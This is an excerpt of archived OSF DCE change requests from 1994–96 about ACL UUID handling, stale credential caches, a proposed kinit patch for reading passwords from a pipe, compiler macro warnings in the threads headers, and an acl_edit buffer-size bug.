   dcecp> acl mod /.:/foo -remove {user melman}

will not work since the registry can't translate "melman" into melman's
uuid.  "acl show" displays the ACL with a UUID instead of the name.  It
would be nice if we could do this on input as well as output.  Could be
done with a -uuid but better if done without.  Would require that
principals not be named with UUID's that don't match the principals UUID.
Not that anyone would try (probably), but they are legal principal names.

Also applies to groups.

[8/26/94 public]
Hmmm, this is what adopting is for.  You are supposed to create a principal
with the old UUID and then you can delete it.

Yes it would still be nice for us to accept UUID's on input.  A -uuid
option is not going to happen for 1.1 though.  Mostly for the doc impact.

[2/7/96 public]
For now HP is just going to put a line or two into the 'acl' manpage
going over the procedure for adopting.  As an enhancement, we'll
think about accepting a UUID as an ACL key.  As Howard has stated,
it will be important to check the registry for principals or groups
named with a UUID, and once sure it truly isn't a registry object,
then treating it as a UUID.

So re-open.



CR Number                     : 10536
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : sec
Subcomponent Name             : sec_id API
Short Description             : stale name cache -- missed hints?
Reported Date                 : 5/4/94
Found in Baseline             : 1.0.2
Found Date                    : 5/4/94
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[5/4/94 public]
  Taken directly from the external report we received:
.
> RPC code seems to check principal names rather than UUIDs when
> checking accuracy of connections cached in the credentials file.
> Resulting in communication errors when server's principal is deleted
> and recreated.
>
> I start a Encina logserver with a principal 'A', I then issues
> commands to it via 'logadmin' a client program of the logserver.  My
> local credentials files therefore caches the connection to the
> principal 'A'.  If however I stop the server, remove its principal and
> then create a new principal also named 'A' and then restart the server
> using this new principal 'A', I can not talk to the logserver unless I
> kdestroy and dce_login again, because my credentials file has the old
> A in its cache and does not detect the change.  This same problem
> shows up in a more serious place as well.
>
> The Encina monitor has a node manager which is a deamon process which
> starts and stops Encina applications that customers write.  The server
> too has a credentials file and if a user starts an application server
> with a pricipal name 'A', stops the server, destroys the principal,
> recreates the principal 'A' and tries to have the node manager start
> the server again it will not start up.  Unfortunatly the node manager
> does not display an error and just keeps trying to restart the
> application, over and over and over...  The only way around this is to
> stop the node manager which then shuts down all applications on that
> node.



CR Number                     : 10528
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : sec
Subcomponent Name             : krb5_read_password()
Short Description             : kinit requires controlling terminal
Reported Date                 : 5/4/94
Found in Baseline             : 1.0.2
Found Date                    : 5/4/94
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[5/4/94 public]
  Like many other password readers, the library routine used by KRB
to collect passwords from the user go out of their way to ensure that
they are talking to a terminal. In KRB's case, it isn't that it goes out
the way, it's just plain that the way was built on the assumption that the
input device was a terminal.
  A testing script here tried to pipe the password into 'kinit' in order
to ensure a given amount of time remained within the lifetime of the
script's inherited context. The result:
.
        kinit: Invalid argument while getting initial credentials
.
  I understand all the motivations behind keeping passwords off of
command lines -- I agree with those motivations. But with more and more
tests being written in PERL and things like TCL, there's a growing
reliance on being able to write any test without invoking a compiler
(sigh). With no access to the Security API, such a test wants to use
'kinit' to rejuvenate its credentials before it starts a pass in a test.
It was pointed out that 'dce_login' accepts the '-e' option, but
dce_login spawns a new shell with a new PAG, and for DFS testing this is
a liability (I am told). So 'kinit' was flagged as having a bug, a bug
in which it will not read stdin for the password if there is no
controlling tty.
.
  My initial attempt to solve this is diff'd below. I passed a
stripped-down copy of the reader down through the chain of command if
kinit is run with a new option (-P for pipe, capitalized to reduce the
chance of conflict with any future flags). We didn't take this route,
and this diff is (for us) deadwood, unless the OSF likes it and accepts
it as common code.
.
  Other options we have considered would be to just simply jump around
all the terminal control after using isatty() or ioctl() to determine
whether or not there's a pipe on stdin... 
.
------------------------------------------------------------------
------------------------------------------------------------------
------------------------------------------------------------------
Checked-out CML/delta/travis-tr10732-kinit-gets-a-pipe-option, revision
1.1 Delta: travis-tr10732-kinit-gets-a-pipe-option Change:
security/krb5/clients/kinit/kinit.c from 9.2 to 9.3
=================================================================== RCS
file:
/afs/tr/project/dce/dev/rcs/security/krb5/clients/kinit/RCS/kinit.c,v
retrieving revision 9.2 retrieving revision 9.3 diff
-Lsecurity/krb5/clients/kinit/kinit.c -c -r9.2 -r9.3 ***
security/krb5/clients/kinit/kinit.c --- 9.3	1994/02/10 19:17:25
*************** *** 2,7 **** --- 2,23 ----
   * @TRANSARC_COPYRIGHT@
   *
   * $TALog: kinit.c,v $
+  * Revision 9.3  1994/02/10  19:17:25  travis
+  *   Add an ability for krb5_process_as_reply to read the incoming
+  *   (user-supplied) password on a non-terminal device (stdin as a pipe,
+  *   for example).
+  *
+  *   Add a -P flag (for -Pipe) to inform the logic to pass
+  *   a different "getkey" function into the KRB5 AS works.
+  *
+  *   Update the usage message to include the new flag.
+  *
+  *   Bring in the (unexported, by historical precedence) get-key
+  *   function's signature.
+  *
+  *   Pass the new get-key'er into KRB5 if the -P option was found.
+  * [from r9.2 by delta travis-tr10732-kinit-gets-a-pipe-option, r1.1]
+  *
   * Revision 9.2  1993/09/25  21:19:30  travis
   *   Watch time intervals more closely to reject illegal units.
   *
***************
*** 16,22 ****
   */
  
  #if !defined(_NOIDENT) && !defined(lint)
! static char *TARCSId = "$Id: c010528,v 1.7 96/03/11 17:45:15 root Exp $";
  #endif
  
  /*
--- 32,38 ----
   */
  
  #if !defined(_NOIDENT) && !defined(lint)
! static char *TARCSId = "$Id: c010528,v 1.7 96/03/11 17:45:15 root Exp $";
  #endif
  
  /*
***************
*** 91,97 ****
  
  #if !defined(lint) && !defined(SABER)
  static char rcsid_kinit_c [] =
! "$Id: c010528,v 1.7 96/03/11 17:45:15 root Exp $";
  #endif  /* !lint & !SABER */
  
  #include <stdio.h>
--- 107,113 ----
  
  #if !defined(lint) && !defined(SABER)
  static char rcsid_kinit_c [] =
! "$Id: c010528,v 1.7 96/03/11 17:45:15 root Exp $";
  #endif  /* !lint & !SABER */
  
  #include <stdio.h>
***************
*** 311,316 ****
--- 327,342 ----
  #endif
  );
  
+ /*  declaration of string password keyproc defined in in_tkt_pwd.c */
+ krb5_error_code  pwd_keyproc_pipe (
+ #ifdef __STDC__ 
+      krb5_keytype  type,
+      krb5_keyblock ** key,
+      krb5_const_pointer keyseed,
+      krb5_pa_data ** padata
+ #endif
+ );
+ 
  void
  main(argc, argv)
      int argc;
***************
*** 321,326 ****
--- 347,353 ----
      long lifetime = KRB5_DEFAULT_LIFE;  /* -l option */
      long rlife = 0;
      long verbose = 0;           /* -v option */
+     long piping = 0;		/* -P option */
      int options = KRB5_DEFAULT_OPTIONS;
      int option;
      int errflg = 0;
***************
*** 345,351 ****
      if (strrchr(argv[0], '/'))
          argv[0] = strrchr(argv[0], '/')+1;
  
!     while ((option = getopt(argc, argv, "vr:fpl:c:")) != EOF) {
          switch (option) {
          case 'r':
              options |= KDC_OPT_RENEWABLE;
--- 372,378 ----
      if (strrchr(argv[0], '/'))
          argv[0] = strrchr(argv[0], '/')+1;
  
!     while ((option = getopt(argc, argv, "vr:fpl:c:P")) != EOF) {
          switch (option) {
          case 'r':
              options |= KDC_OPT_RENEWABLE;
***************
*** 358,363 ****
--- 385,392 ----
          case 'v':
              verbose++;
              break;
+         case 'P':
+             piping++;
          case 'p':
              options |= KDC_OPT_PROXIABLE;
              break;
***************
*** 406,412 ****
      }
      
      if (errflg) {
!         fprintf(stderr, "Usage: %s [ -r time ] [ -vpf ] [ -l lifetime ] [ -c cachename ] principal\n", argv[0]);
          exit(2);
      }
      if (ccache == NULL) {
--- 435,441 ----
      }
      
      if (errflg) {
!         fprintf(stderr, "Usage: %s [ -r time ] [ -vpfP ] [ -l lifetime ] [ -c cachename ] principal\n", argv[0]);
          exit(2);
      }
      if (ccache == NULL) {
***************
*** 472,478 ****
                                       options, 
                                       my_addresses, 
                                       KEYTYPE_DES, 
!                                      pwd_keyproc, 
                                       &keyseed,
                                       krb5_kdc_rep_decrypt_proc, 0,
                                       &my_creds, 
--- 501,507 ----
                                       options, 
                                       my_addresses, 
                                       KEYTYPE_DES, 
!                                      piping ? pwd_keyproc_pipe : pwd_keyproc, 
                                       &keyseed,
                                       krb5_kdc_rep_decrypt_proc, 0,
                                       &my_creds, 
Delta: travis-tr10732-kinit-gets-a-pipe-option
Change: security/krb5/include/krb5/los-proto.h from 9.1 to 9.2
===================================================================
RCS file: /afs/tr/project/dce/dev/rcs/security/krb5/include/krb5/RCS/los-proto.h,v
retrieving revision 9.1
retrieving revision 9.2
diff -Lsecurity/krb5/include/krb5/los-proto.h -c -r9.1 -r9.2
*** security/krb5/include/krb5/los-proto.h
--- 9.2	1994/02/10 19:17:28
***************
*** 1,3 ****
--- 1,21 ----
+ /*-
+  * @TRANSARC_COPYRIGHT@
+  *
+  * $TALog: los-proto.h,v $
+  * Revision 9.2  1994/02/10  19:17:28  travis
+  *   Add an ability for krb5_process_as_reply to read the incoming
+  *   (user-supplied) password on a non-terminal device (stdin as a pipe,
+  *   for example).
+  *
+  *   Export the new routine "krb5_load_password", which mocks
+  *   the function of "krb5_read_password" with the exception
+  *   of not echoing anything to stdout/stderr and of not
+  *   doing any terminal control whatsoever.
+  * [from r9.1 by delta travis-tr10732-kinit-gets-a-pipe-option, r1.1]
+  *
+  * $EndTALog$
+  */
+ 
  /*
   * @OSF_COPYRIGHT@
   * COPYRIGHT NOTICE
***************
*** 28,35 ****
  */
  /*
   * $Source: /project/ot/dce/d01/d05/RCS/c010528,v $
!  * $Author: root $
!  * $Id: c010528,v 1.7 96/03/11 17:45:15 root Exp $
   *
   * Copyright 1990,1991 by the Massachusetts Institute of Technology.
   * All Rights Reserved.
--- 46,53 ----
  */
  /*
   * $Source: /project/ot/dce/d01/d05/RCS/c010528,v $
!  * $Author: root $
!  * $Id: c010528,v 1.7 96/03/11 17:45:15 root Exp $
   *
   * Copyright 1990,1991 by the Massachusetts Institute of Technology.
   * All Rights Reserved.
***************
*** 59,64 ****
--- 77,88 ----
  
  #include <stdio.h>
  
+ /* Transarc addition for passing passwords through non-ttys */
+ krb5_error_code krb5_load_password
+ 	PROTOTYPE((char *,
+ 		   char *,
+ 		   char *,
+ 		   int * ));
  /* libos.spec */
  krb5_error_code krb5_read_password
  	PROTOTYPE((char *,
Delta: travis-tr10732-kinit-gets-a-pipe-option
Change: security/krb5/lib/krb/in_tkt_pwd.c from 9.1 to 9.2
===================================================================
RCS file: /afs/tr/project/dce/dev/rcs/security/krb5/lib/krb/RCS/in_tkt_pwd.c,v
retrieving revision 9.1
retrieving revision 9.2
diff -Lsecurity/krb5/lib/krb/in_tkt_pwd.c -c -r9.1 -r9.2
*** security/krb5/lib/krb/in_tkt_pwd.c
--- 9.2	1994/02/10 19:17:31
***************
*** 1,3 ****
--- 1,28 ----
+ /*-
+  * @TRANSARC_COPYRIGHT@
+  *
+  * $TALog: in_tkt_pwd.c,v $
+  * Revision 9.2  1994/02/10  19:17:31  travis
+  *   Add an ability for krb5_process_as_reply to read the incoming
+  *   (user-supplied) password on a non-terminal device (stdin as a pipe,
+  *   for example).
+  *
+  *   Create a common routine which is the embodiment of the old
+  *   get_keyproc. Use this common routine to implement get_keyproc
+  *   as a simple jacket of this new routine. Also use the new common
+  *   routine as the underlying logic beneath a new get-key routine
+  *   which differs only in that it knows to call krb5_load_password()
+  *   instead of krb5_read_password(); this is useful when the calling
+  *   application is not using a "terminal" for stdin.
+  * [from r9.1 by delta travis-tr10732-kinit-gets-a-pipe-option, r1.1]
+  *
+  * $EndTALog$
+  */
+ 
+ #if !defined(_NOIDENT) && !defined(lint)
+ static char *TARCSId = "$Id: c010528,v 1.7 96/03/11 17:45:15 root Exp $";
+ #endif
+ 
  /*
   * @OSF_COPYRIGHT@
   * COPYRIGHT NOTICE
***************
*** 28,34 ****
  */
  /*
   * $Source: /project/ot/dce/d01/d05/RCS/c010528,v $
!  * $Author: root $
   *
   * Copyright 1990,1991 by the Massachusetts Institute of Technology.
   * All Rights Reserved.
--- 53,59 ----
  */
  /*
   * $Source: /project/ot/dce/d01/d05/RCS/c010528,v $
!  * $Author: root $
   *
   * Copyright 1990,1991 by the Massachusetts Institute of Technology.
   * All Rights Reserved.
***************
*** 54,60 ****
  
  #if !defined(lint) && !defined(SABER)
  static char rcsid_in_tkt_pwd_c[] =
! "$Id: c010528,v 1.7 96/03/11 17:45:15 root Exp $";
  #endif	/* !lint & !SABER */
  
  #include <krb5/krb5.h>
--- 79,85 ----
  
  #if !defined(lint) && !defined(SABER)
  static char rcsid_in_tkt_pwd_c[] =
! "$Id: c010528,v 1.7 96/03/11 17:45:15 root Exp $";
  #endif	/* !lint & !SABER */
  
  #include <krb5/krb5.h>
***************
*** 76,90 ****
   *      libdce
   */
  
  krb5_error_code
! pwd_keyproc(DECLARG(const krb5_keytype, type),
! 	    DECLARG(krb5_keyblock **, key),
!             DECLARG(krb5_const_pointer, keyseed),
!             DECLARG(krb5_pa_data **,padata))
  OLDDECLARG(const krb5_keytype, type)
  OLDDECLARG(krb5_keyblock **, key)
  OLDDECLARG(krb5_const_pointer, keyseed)
  OLDDECLARG(krb5_pa_data **,padata)
  {
      krb5_data salt;
      krb5_error_code retval;
--- 101,126 ----
   *      libdce
   */
  
+ /* The additional argument specifying the function that will actually
+  * put the 'keystrokes' of the password together takes the following
+  * form (a duplicate of the signature for krb5_read_password).
+  */
+ typedef krb5_error_code (*assemble_password) PROTOTYPE((char *,
+ 							char *,
+ 							char *,
+ 							int *));
+ static
  krb5_error_code
! pwd_keyproc_common(DECLARG(const krb5_keytype, type),
!                    DECLARG(krb5_keyblock **, key),
!                    DECLARG(krb5_const_pointer, keyseed),
!                    DECLARG(krb5_pa_data **,padata),
! 		   DECLARG(assemble_password, keyreader))
  OLDDECLARG(const krb5_keytype, type)
  OLDDECLARG(krb5_keyblock **, key)
  OLDDECLARG(krb5_const_pointer, keyseed)
  OLDDECLARG(krb5_pa_data **,padata)
+ OLDDECLARG(assemble_password, keyreader)
  {
      krb5_data salt;
      krb5_error_code retval;
***************
*** 121,129 ****
      }
  
      if (!arg->password.length) {
! 	if (retval = krb5_read_password(krb5_default_pwd_prompt1,
! 					0,
! 					pwdbuf, &pwsize)) {
  	    if (f_salt) xfree(salt.data);
  	    return retval;
  	}
--- 157,165 ----
      }
  
      if (!arg->password.length) {
! 	if (retval = (keyreader)(krb5_default_pwd_prompt1,
! 				 0,
! 				 pwdbuf, &pwsize)) {
  	    if (f_salt) xfree(salt.data);
  	    return retval;
  	}
***************
*** 149,154 ****
--- 185,218 ----
      if (f_salt) xfree(salt.data);
      return 0;
  }
+ 
+ krb5_error_code
+ pwd_keyproc(DECLARG(const krb5_keytype, type),
+             DECLARG(krb5_keyblock **, key),
+             DECLARG(krb5_const_pointer, keyseed),
+             DECLARG(krb5_pa_data **,padata))
+ OLDDECLARG(const krb5_keytype, type)
+ OLDDECLARG(krb5_keyblock **, key)
+ OLDDECLARG(krb5_const_pointer, keyseed)
+ OLDDECLARG(krb5_pa_data **,padata)
+ {
+   return pwd_keyproc_common(type, key, keyseed, padata, krb5_read_password);
+ }
+ 
+ krb5_error_code
+ pipe_pwd_keyproc(DECLARG(const krb5_keytype, type),
+                  DECLARG(krb5_keyblock **, key),
+                  DECLARG(krb5_const_pointer, keyseed),
+                  DECLARG(krb5_pa_data **,padata))
+ OLDDECLARG(const krb5_keytype, type)
+ OLDDECLARG(krb5_keyblock **, key)
+ OLDDECLARG(krb5_const_pointer, keyseed)
+ OLDDECLARG(krb5_pa_data **,padata)
+ {
+   return pwd_keyproc_common(type, key, keyseed, padata, krb5_load_password);
+ }
+ 
+ 
  
  /*
   Attempts to get an initial ticket for creds->client to use server
Delta: travis-tr10732-kinit-gets-a-pipe-option
Change: security/krb5/lib/os/read_pwd.c from 9.2 to 9.3
===================================================================
RCS file: /afs/tr/project/dce/dev/rcs/security/krb5/lib/os/RCS/read_pwd.c,v
retrieving revision 9.2
retrieving revision 9.3
diff -Lsecurity/krb5/lib/os/read_pwd.c -c -r9.2 -r9.3
*** security/krb5/lib/os/read_pwd.c
--- 9.3	1994/02/10 19:17:34
***************
*** 2,7 ****
--- 2,18 ----
   * @TRANSARC_COPYRIGHT@
   *
   * $TALog: read_pwd.c,v $
+  * Revision 9.3  1994/02/10  19:17:34  travis
+  *   Add an ability for krb5_process_as_reply to read the incoming
+  *   (user-supplied) password on a non-terminal device (stdin as a pipe,
+  *   for example).
+  *
+  *   Implement the new routine "krb5_load_password", which mocks
+  *   the function of "krb5_read_password" with the exception
+  *   of not echoing anything to stdout/stderr and of not
+  *   doing any terminal control whatsoever.
+  * [from r9.2 by delta travis-tr10732-kinit-gets-a-pipe-option, r1.1]
+  *
   * Revision 9.2  1993/06/23  13:30:14  aswini
   * [merge of changes from 8.1 to 8.2 into 9.1]
   *
***************
*** 9,15 ****
   */
  
  #if !defined(_NOIDENT) && !defined(lint)
! static char *TARCSId = "$Id: c010528,v 1.7 96/03/11 17:45:15 root Exp $";
  #endif
  
  /*
--- 20,26 ----
   */
  
  #if !defined(_NOIDENT) && !defined(lint)
! static char *TARCSId = "$Id: c010528,v 1.7 96/03/11 17:45:15 root Exp $";
  #endif
  
  /*
***************
*** 50,56 ****
   */
  /*
   * $Source: /project/ot/dce/d01/d05/RCS/c010528,v $
!  * $Author: root $
   *
   * Copyright 1990,1991 by the Massachusetts Institute of Technology.
   * All Rights Reserved.
--- 61,67 ----
   */
  /*
   * $Source: /project/ot/dce/d01/d05/RCS/c010528,v $
!  * $Author: root $
   *
   * Copyright 1990,1991 by the Massachusetts Institute of Technology.
   * All Rights Reserved.
***************
*** 77,83 ****
  
  #if !defined(lint) && !defined(SABER)
  static char rcsid_read_pwd_c[] =
! "$Id: c010528,v 1.7 96/03/11 17:45:15 root Exp $";
  #endif	/* lint */
  
  #include <krb5/krb5.h>
--- 88,94 ----
  
  #if !defined(lint) && !defined(SABER)
  static char rcsid_read_pwd_c[] =
! "$Id: c010528,v 1.7 96/03/11 17:45:15 root Exp $";
  #endif	/* lint */
  
  #include <krb5/krb5.h>
***************
*** 326,328 ****
--- 337,509 ----
  
      return 0;
  }
+ 
+ 
+ /* This macro becomes straightforward when term. control is removed.
+  * It's only used where mutiple statements are expected; a do {} while ()
+  * would provoke "statement not reached" warnings.
+  */
+ 
+ #undef  cleanup
+ #define cleanup(errcode) (void) signal(SIGINT, ointrfunc); return errcode;
+ 
+ /* Reiterate the actions of read_password, without sending anything
+  * to stdout/err, and using the prompts more as booleans to direct whether
+  * or not to confirm the sent password. Expect the password on stdin.
+  */
+ krb5_error_code
+ krb5_load_password(prompt, prompt2, return_pwd, size_return)
+ char *prompt;
+ char *prompt2;
+ char *return_pwd;
+ int *size_return;
+ {
+     /* adapted from Kerberos v4 des/read_password.c */
+ #if defined(__STDC__) || defined(mips)
+     /* readin_string is used after a longjmp, so must be volatile */
+     volatile
+ #endif
+              char *readin_string = 0;
+     register char *ptr;
+     int scratchchar;
+     krb5_sigtype (*ointrfunc)();
+ #ifdef apollo
+     char ch, *ch_p;
+ #endif
+ 
+ #if defined(SNI_SVR4_POSIX) || defined(SUNOS5)
+     if (sigsetjmp(pwd_jump,1))
+ #else
+     if (setjmp(pwd_jump))
+ #endif
+     {
+ 	/* interrupted */
+ 	if (readin_string) {
+ 	    (void) memset((char *)readin_string, 0, *size_return);
+ 	    xfree(readin_string);
+ 	}
+ 	(void) memset(return_pwd, 0, *size_return);
+ 	cleanup(KRB5_LIBOS_PWDINTR);
+     }
+     /* save intrfunc */
+ #if defined(SNI_SVR4_POSIX) || defined(SUNOS5)
+     /*
+      *   FIX-ME:
+      *       It would be desirable to use sigaction(2) here but
+      *   the current implementation of DCE pthreads does not
+      *   allow sigaction to be used with asynchronous signals.
+      *
+      *   sigset(2) is used here because, unlike signal(2),
+      *   it blocks the signal within the interrupt handler
+      *   and does not set its disposition to SIG_DFL.
+      *   It also restores the signal mask that was in effect
+      *   after exiting the signal handler.
+      */
+     if ( (ointrfunc = sigset(SIGINT, intr_routine)) == SIG_ERR )
+ 		{
+ 		perror("sigset: intr_routine");
+ 		exit(1);
+ 		}
+ #else
+     ointrfunc = signal(SIGINT, intr_routine);
+ #endif
+ 
+     /* Since this isn't a terminal, no need to put out the prompt */
+ 
+     (void) memset(return_pwd, 0, *size_return);
+ 
+ #ifdef apollo
+     ch_p = return_pwd;
+     while ((ch = fgetc(stdin)) != '\n'  &&  ch != '\r'  &&  ch != EOF ) {
+         *ch_p++ = ch;
+     }
+ #else
+     if (fgets(return_pwd, *size_return, stdin) == NULL) {
+ 	/* error */
+ 	(void) memset(return_pwd, 0, *size_return);
+ 	cleanup(KRB5_LIBOS_CANTREADPWD);
+     }
+ #endif
+     /* fgets always null-terminates the returned string */
+ 
+     /* replace newline with null */
+     if (ptr = strchr(return_pwd, '\n'))
+ 	*ptr = '\0';
+ #ifndef apollo
+     else /* flush rest of input line */
+ 	do {
+ 	    scratchchar = getchar();
+ 	} while (scratchchar != EOF && scratchchar != '\n');
+ #endif /* apollo */
+ 
+     if (prompt2) {
+ 	/* Mock the read-password behavior, but don't put out the prompt */
+ 	readin_string = malloc(*size_return);
+ 	if (!readin_string) {
+ 	    (void) memset(return_pwd, 0, *size_return);
+ 	    cleanup(ENOMEM);
+ 	}
+ 	(void) memset((char *)readin_string, 0, *size_return);
+ #ifdef apollo
+         ch_p = readin_string;
+         while ((ch = fgetc(stdin)) != '\n'  &&  ch != '\r'  &&  ch != EOF ) {
+                 *ch_p++ = ch;
+         }
+ #else
+ 	if (fgets((char *)readin_string, *size_return, stdin) == NULL) {
+ 	    /* error */
+ 	    (void) memset((char *)readin_string, 0, *size_return);
+ 	    (void) memset(return_pwd, 0, *size_return);
+ 	    xfree(readin_string);
+ 	    cleanup(KRB5_LIBOS_CANTREADPWD);
+ 	}
+ #endif /* apollo */
+ 
+ 	if (ptr = strchr((char *)readin_string, '\n'))
+ 	    *ptr = '\0';
+ #ifndef apollo
+         else /* need to flush */
+ 	    do {
+ 		scratchchar = getchar();
+ 	    } while (scratchchar != EOF && scratchchar != '\n');
+ #endif /* apollo */
+ 	    
+ 	/* compare */
+ 	if (strncmp(return_pwd, (char *)readin_string, *size_return)) {
+ 	    (void) memset((char *)readin_string, 0, *size_return);
+ 	    (void) memset(return_pwd, 0, *size_return);
+ 	    xfree(readin_string);
+ 	    cleanup(KRB5_LIBOS_BADPWDMATCH);
+ 	}
+ 	(void) memset((char *)readin_string, 0, *size_return);
+ 	xfree(readin_string);
+     }
+     
+     /* reset intrfunc */
+ #if defined(SNI_SVR4_POSIX) || defined(SUNOS5)
+     /*
+      *   FIX-ME:
+      *       It would be desirable to use sigaction(2) here but
+      *   the current implementation of DCE pthreads does not
+      *   allow sigaction to be used with asynchronous signals.
+      *
+      *   sigset(2) is used here because, unlike signal(2),
+      *   it blocks the signal within the interrupt handler
+      *   and does not set its disposition to SIG_DFL.
+      *   It also restores the signal mask that was in effect
+      *   after exiting the signal handler.
+      */
+     if ( sigset(SIGINT, ointrfunc) == SIG_ERR )
+ 		{
+ 		perror("sigset: ointrfunc");
+ 		exit(1);
+ 		}
+ #else
+     (void) signal(SIGINT, ointrfunc);
+ #endif
+ 
+     *size_return = strlen(return_pwd);
+ 
+     return 0;
+ }
+

[8/11/94 public]
I definately don't understand all that happens here, but does the login
command in dcecp make this easier?  In a dcecp session you can DCE login as
another user using the dcecp login command.  Then for that dcecp session
you are that user.  There is a corresponding logout command and yes they
nest. We write dcecp scripts all the time that:

   login cell_admin -password -dce-

   stuff

   logout
   exit

Yes we know that these "setuid" scripts are bad, we run them as tests.  If
you don't like imbeding the password in the script you can use builtin Tcl
command to ask the user, read it from a file, get if from a command line
argument, etc.  Just a thought.

[8/23/94 public]

Is this still of interest ?  I think that if we are going to change kinit
at all we should keep the interface as consistent with dce_login as
possible, that is allow passing the passwd on the command line.  Different
usage will feel very idiosyncratic.

[3/11/96 public]
Downgraded to E4, since this functionality is now available with "dce_login -r"
which is what should be used to refresh DCE credentials anyway.  Made it an
enhancement request to improve kinit, in case anybody wants to do it.



CR Number                     : 10510
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : thr
Subcomponent Name             : 
Short Description             : Compiler warning: ""macro
replacement within a string literal"
Reported Date                 : 5/3/94
Found in Baseline             : 1.0.3
Found Date                    : 5/3/94
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[5/3/94 public]

Customer reported that the following files give compilation warning when
using SVR4/FTX compiler:

                        src/threads/cma_mutex.h
                        src/threads/cma_queue.h
                        src/threads/cma_sched.h
                        src/threads/cma_thread_io.h

The warning msg is "macro replacement within a string literal".

To avoid a macro replacement string, try not to include any
word which is similar to the argument name.

For example:

* in cma_mutex.h
-----------------
# define cma__int_unlock(mutex) { \
    cma__t_int_tcb      *__utcb__; \
    __utcb__ = cma__get_self_tcb (); \
    if (((cma__t_int_mutex *)mutex)->mutex_kind == cma_c_mutex_fast) { \
        cma__assert_warn ( \
                (__utcb__ == ((cma__t_int_mutex *)mutex)->owner), \
                "attempt to release mutex owned by another thread"); \
        ((cma__t_int_mutex *)mutex)->owner = (cma__t_int_tcb *)cma_c_null_ptr; \
        } \
    cma__unset (((cma__t_int_mutex *)mutex)->unlock); \
    if (!cma__test_and_set (&((cma__t_int_mutex *)mutex)->event)) { \
        cma_t_status    res;\
        res = cma__int_mutex_unblock ((cma__t_int_mutex *)mutex); \
        if (res != cma_s_normal) cma__error (res); \
        } \
    }

Using the word "mutex" inside the string "attempt to release mutex owned by
another thread" will cause the warning error
    Warning: macro replacement within a string literal

Proposed Solution: Just change the argument name mutex to _mutex


* in cma_queue.h
----------------
#if ((_CMA_PLATFORM_ != _CMA__SINIX_MX300I) &&
               (_CMA_PLATFORM_ != _CMA__DCOSX_MI PS))
#define cma__queue_empty(head) (                 \
   cma__assert_fail (                            \
      (head)->blink->flink == (head),            \
      "cma__queue_empty: queue corruption -- head->blink->flink != head"), \
   cma__assert_fail (                            \
      (head)->flink->blink == (head),            \
      "cma__queue_empty: queue corruption -- head->flink->blink != head"), \
    (head)->flink == (head))
#else
.
.
#endif

Using the work "head" inside the string
   "cma__queue_empty: queue corruption -- head->blink->flink != head"

Proposed Solution: Change the argument name head to _head

----------------

#if ((_CMA_PLATFORM_ != _CMA__SINIX_MX300I) &&
               (_CMA_PLATFORM_ != _CMA__DCOSX_MI PS))
#define cma__queue_insert(element,q_ptr)    (        \
   cma__assert_fail (                               \
     (element)->flink == 0,                    \
     "cma__queue_insert: queue corruption -- element flink not zero"), \
   cma__assert_fail (                               \
     (element)->blink == 0,                   \
     "cma__queue_insert: queue corruption -- element blink not zero"), \
   cma__assert_fail (                               \
     (q_ptr)->blink->flink == (q_ptr),        \
     "cma__queue_insert: queue corruption -- q_ptr->blink->flink != q_ptr "), \
    cma__assert_fail (                                  \
     (q_ptr)->flink->blink == (q_ptr),         \
     "cma__queue_insert: queue corruption -- q_ptr->flink->blink != q_ptr "), \
    (element)->blink           = (q_ptr)->blink,      \
    (element)->flink           = (q_ptr),             \
    (q_ptr)->blink->flink      = (element),           \
    (q_ptr)->blink             = (element))
#else
  .
  .
#endif

Proposed Solution: Change the argument name "element" to "_element" and
"q_ptr" to _q_ptr"

-----------------------------------

Same things happen in macro cma__queue_insert_after, cma__queue_next,
cma__queue_previous, cma__queue_remove.

* in cma_sched.h
----------------

The macro cma__sched_parameterize has the same problem

* in cma_thread_io.h
---------------------
Macros cma__ts_open, cma__ts_open2 have the same problem



CR Number                     : 10507
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : acl_edit
Short Description             : acl_edit entry length in 'assign' cmd could be unlimited
Reported Date                 : 5/2/94
Found in Baseline             : 1.0.3
Found Date                    : 5/2/94
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : security/client/admin/acl_edit/deif.c
Sensitivity                   : public

[5/2/94 public]
I should be shot for this one :-(  For some unknown reason, when acl_edit was
first written years ago (ok, so I was a rookie, shoot me) I made the (now bad)
assumption that an acl entry would never be more than 256 characters, so when
the acl_edit 'assign' command reads entries in from a file, it only uses a
buffer of max size 256.  If someone else had made a mistake like this I'd be
really upset, but as it is, all I can do is sulk and fix it...

This means that old (1.0.x) acl_edit's will not be able to 'assign' extended
entry types from a file, that correspond to the encoded entry types that DCE1.1
will be passing back to 1.0.x clients.  1.0.x acl_edit's will still be able
to lookup, change other entries and replace 1.1 ACLs, they just won't be able
to write them to a file, edit the file and assign the ACL from that file (not
a common thing to do, but it is broken...  (you get invalid extended entry type
when you try to do the assign because it's missing part of the entry).

For those that want to patch their 1.0.x products, change the buffer size of
sec_acl_entry_str in deif_sec_acl_from_file() to something more reasonable than
256 (the biggest entry I've seen is 276, but they could be much larger if you
had an extra long cellname/principal name in the DCE1.1 entry).  The simplest
fix is to change it to 1024 (bigger than anything we currently know of), but
it probably should be fixed so that it does the right thing in the future (so
we don't hit this again when another unforseen change causes entries larger
than 1024 chars).

[7/14/94 public]
